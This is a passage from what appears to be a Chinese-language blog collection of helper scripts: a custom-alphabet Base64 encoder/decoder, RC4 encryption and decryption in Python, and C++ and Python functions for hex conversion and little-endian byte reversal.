punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_base64_decode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 将字符串转化为2进制</span>    bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'='</span><span class="token punctuation">:</span>            x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>6&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">## print(bin_str)</span>    <span class="token comment">## 输出的字符串</span>    outputs <span class="token operator">=</span> <span class="token string">""</span>    nums <span class="token operator">=</span> inputs<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>        temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>        temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>        <span class="token comment">## print(temp_str)</span>        <span class="token comment">## 补足8位字节</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            temp_str <span class="token operator">=</span> temp_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> nums <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>        <span class="token comment">## 将四个6字节的二进制转换为三个字符</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            outputs <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"     可更换码表的 Base64 加解密系统       "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>select <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"是否更换加密的码表? (y or n) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> select <span class="token operator">==</span> <span class="token string">"y"</span> <span class="token keyword">or</span> select <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"在这里输入码表: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....done, 已更改!"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"码表未做更改!"</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择要进行的操作? (1:加密 or 2:解密) 你的选择: "</span><span class="token punctuation">)</span><span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"1:加密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文以加密: "</span><span class="token punctuation">)</span>    my_base64_encode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"2:解密"</span><span class="token punctuation">:</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入密文以解密: "</span><span class="token punctuation">)</span>    my_base64_decode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....bye"</span><span class="token punctuation">)</span></code></pre><hr><h2 id="RC4-加解密"><a href="#RC4-加解密" class="headerlink" title="RC4 加解密"></a>RC4 加解密</h2><h3 id="Python版（简洁脚本）-1"><a href="#Python版（简洁脚本）-1" class="headerlink" title="Python版（简洁脚本）"></a>Python版（简洁脚本）</h3><ul><li><p><strong>特点</strong></p><ol><li>利用 Python 库快捷实现 RC4 算法</li><li><code>Key</code> 表示 RC4 的密钥，<code>Str</code> 表示待加解密的内容（<strong>bytes型</strong>）</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> ARC4flag <span class="token operator">=</span> ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>Key<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>Str<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><hr><h3 id="Python版（具体实现）"><a href="#Python版（具体实现）" class="headerlink" title="Python版（具体实现）"></a>Python版（具体实现）</h3><ul><li><p><strong>特点</strong></p><ol><li>包含具体实现流程</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-python" data-language="python"><code class="language-python">Str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment">## 待加解密的内容</span>Key <span class="token operator">=</span> <span class="token string">""</span>    <span class="token comment">## 密钥key</span>flag <span class="token operator">=</span> <span class="token string">""</span>   <span class="token comment">## 存放加解密后的结果</span><span class="token comment">## ---------- rc4_init ----------</span>s_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment">## 定义 s 盒</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 生成初始 s 盒</span>    s_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token comment">##   T[i] = K[i mod len(Key)]    ## 这个算法里没有 T[i]，下面会解释</span>t <span class="token operator">=</span> <span class="token number">0</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">## 打乱 s 盒顺序</span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>Key<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>     <span class="token comment">## j = (j + S[i] + T[i]) mod 256</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp    t <span class="token operator">=</span> t <span class="token operator">+</span> <span class="token number">1</span>               <span class="token comment">## 这里引入的 t 加一个 if 条件其实就是为了做 t = i % len(Key)</span>    <span class="token keyword">if</span> t <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Key<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment">## Key[t] 配合 t = i % len(Key) 就是实现了 T[i] = K[i mod len(Key)]</span>        t <span class="token operator">=</span> <span class="token number">0</span>               <span class="token comment">## 小细节写法不同而已，大致思路是一样的</span><span class="token comment">## ---------- rc4_crypt ----------</span>i <span class="token operator">=</span> <span class="token number">0</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>      <span class="token comment">## &amp; 0xff 是为了做 % 256，两者效果相同</span>    tmp <span class="token operator">=</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp    t <span class="token operator">=</span> <span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment">## &amp; 0xff 是为了做 % 256，两者效果相同</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>Str<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> s_box<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">## 明文异或得密文，密文异或得明文</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><hr><h2 id="任意进制-int-型-十六进制-string-型"><a href="#任意进制-int-型-十六进制-string-型" class="headerlink" title="任意进制 int 型 - 十六进制 string 型"></a>任意进制 int 型 - 十六进制 string 型</h2><h3 id="C-普通版"><a href="#C-普通版" class="headerlink" title="C++普通版"></a>C++普通版</h3><ul><li><p><strong>特点</strong></p><ol><li>以 <code>&#39;0x&#39;</code> 开头</li><li>转换后的数，位数都要相同，高位不足的补 <code>0</code></li><li><code>num</code> 为待转换的十进制数，<code>width</code> 为转换后的十六进制数的位数，不包括 <code>&#39;0x&#39;</code></li><li>结果以字符串形式输出</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">std<span class="token double-colon punctuation">::</span>string <span class="token function">int_to_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>width <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>    s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span><span class="token punctuation">&#125;</span>std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span><span class="token keyword">return</span> s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><hr><h3 id="C-递归版"><a href="#C-递归版" class="headerlink" title="C++递归版"></a>C++递归版</h3><ul><li><p><strong>特点</strong></p><ol><li>开头不包含 <code>&#39;0x&#39;</code></li><li>不要求位数相同</li><li>结果以字符数组形式输出</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token operator">*</span> <span class="token function">int_to_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">static</span> <span class="token keyword">int</span>  this_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>this_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span>            <span class="token comment">//递归结束条件</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment">//当前数转换成字符放入字符串</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">+</span> <span class="token char">'0'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token char">'a'</span><span class="token punctuation">;</span>    buffer<span class="token punctuation">[</span>this_index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span> <span class="token comment">//字符串结束标志</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">int_to_string</span><span class="token punctuation">(</span>num <span class="token operator">/</span> <span class="token number">16</span><span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//递归调用</span>    this_index<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token comment">//字符串索引+1</span>    num <span class="token operator">%=</span> <span class="token number">16</span><span class="token punctuation">;</span>           <span class="token comment">//计算当前值</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment">//当前数转换成字符放入字符串</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">+</span> <span class="token char">'0'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        buffer<span class="token punctuation">[</span>this_index<span class="token punctuation">]</span> <span class="token operator">=</span> num <span class="token operator">-</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token char">'a'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><hr><h3 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h3><ul><li><strong>代码</strong></li></ul><pre class="language-python" data-language="python"><code class="language-python">tmp <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>  length <span class="token operator">=</span> width <span class="token operator">+</span> <span class="token number">2</span>     <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">&lt;</span> length<span class="token punctuation">:</span>         tmp <span class="token operator">=</span> <span class="token string">'0x'</span><span class="token operator">+</span><span class="token string">'0'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>length <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span></code></pre><hr><h2 id="十六进制-string-型-十进制-int-型"><a href="#十六进制-string-型-十进制-int-型" class="headerlink" title="十六进制 string 型 - 十进制 int 型"></a>十六进制 string 型 - 十进制 int 型</h2><h3 id="C-版"><a href="#C-版" class="headerlink" title="C++版"></a>C++版</h3><ul><li><p><strong>特点</strong></p><ol><li>将 <code>string</code> 类型 的十六进制数 <code>s</code>，从下标 <code>index</code> 的位置开始（包括 <code>&#39;0x&#39;</code>），长度为 <code>length</code> 的部分，转换为十进制数 <code>sum</code></li></ol></li><li><p><strong>头文件</strong></p><ol><li><code>#include &lt;math.h&gt;</code></li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">string_to_dec</span><span class="token punctuation">(</span>string s<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> tmp<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>            tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>        sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>length<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        index<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><hr><h2 id="小端序-int-型-逆向-int-amp-char-型数组"><a href="#小端序-int-型-逆向-int-amp-char-型数组" class="headerlink" title="小端序 int 型 - 逆向 int &amp; char 型数组"></a>小端序 int 型 - 逆向 int &amp; char 型数组</h2><h3 id="C-版-1"><a href="#C-版-1" class="headerlink" title="C++版"></a>C++版</h3><ul><li><p><strong>特点</strong>  </p><ol><li><strong>将小端序存放的 int型 数据转换为正序</strong>，并将结果存放到 int型 的 buffer数组 中 </li><li><mark>若 num 位数超长，将类型改为 <em>int64</em></mark></li><li><mark>若要保存到 <em>char</em> 数组，直接将 <em>int buffer</em> 改为 <em>char buffer</em> 即可</mark></li></ol></li><li><p><strong>参数</strong></p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>num</code></td><td align="left">小端序存放的 <code>int</code> 型数据</td></tr><tr><td align="left"><code>width_num</code></td><td align="left">小端序存放的 <code>int</code> 型数据对应的 十六进制数 去掉 <code>&#39;0x&#39;</code> 后的长度<br></td></tr><tr><td align="left"><code>buffer</code></td><td align="left">用来保存处理结果的 <code>int</code> 型 数组 <code>buffer[]</code>，<code>buffer[]</code> 是 <code>num</code> 的逆向顺序</td></tr><tr><td align="left"><code>buffer_length</code></td><td align="left"><code>buffer[]</code> 的长度，可根据 <code>width_num / 2 </code>得出</td></tr></tbody></table><ul><li><p><strong>头文件</strong></p><ol><li><code>#include &lt;sstream&gt;</code></li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">little_endian</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width_num<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token keyword">int</span> buffer_length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>    std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>    ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>    ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>width_num <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width_num <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>        s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span>    <span class="token punctuation">&#125;</span>    std<span class="token double-colon punctuation">::</span>string s <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> s_temp<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> width_num<span class="token punctuation">,</span> s_temp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 取右width位</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> index <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> index <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 存放十六进制的每一位字符转换后对应的十进制数</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 将2长度的字符串转换为十进制数，存放到sum</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">102</span><span class="token punctuation">)</span>  <span class="token comment">// 处理a-f</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">70</span><span class="token punctuation">)</span>   <span class="token comment">// 处理A-F</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">9</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">64</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>    <span class="token comment">// 处理0-9</span>                tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">;</span>            sum <span class="token operator">=</span> sum <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        index <span class="token operator">=</span> index <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>   <span 